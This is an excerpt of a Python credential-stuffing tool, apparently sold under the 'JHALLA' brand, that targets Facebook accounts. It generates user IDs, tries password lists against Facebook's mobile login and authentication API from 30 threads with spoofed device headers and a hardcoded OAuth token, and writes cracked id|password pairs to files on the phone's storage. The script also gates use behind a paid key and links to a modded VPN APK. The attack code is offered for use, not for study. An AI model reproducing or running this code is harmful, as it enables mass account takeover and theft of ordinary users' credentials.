...
\033[1;37m----------------MANY TERA NAAM DIL RAKH DIYA------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number crack\n [5] Random gmail crack\n [6] Commond owner Whatsapp contact (join)\n [7] Download Vpn\n [8] How To creat File \n [0] Exit menu')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open http://wa.me/+923435908309?text=ABUBAKARSir{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://filepresident.com/c3c86a0e6974860a/Quick_VPN_Mod_apk.apk');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://fb.watch/i97g55EunC/');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923435908309&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ABUBAKAR Sir, I Need To Buy Your Paid JHALLA BRAND Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SILENT:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SILENT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JHALLA-OK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                        ...
                        complete = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    cookies=cookies,
    headers=headers,
)
                        ...
                        if "c_user" in SILENT:
                                ...
                                print('\r\r\033[1;32m [JHALLA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/JHALLA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SILENT:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [JHALLA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JHALLA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [JHALLA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JHALLA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/JHALLA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [JHALLA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JHALLA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JHALLA-OK] '+uid+' | '+pas+'\033[1;97m')
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  with urlopen("https://github.com/Kaptan302/Done/blob/main/Done.txt") as response:
    body = response.read()
    os.system(" clear")
  try:
    if id in str(body):
      ...
      print("\x1b[1;97m    Sorry Bro Token Key not AprovedðŸ˜“");print("Your token is "+id)
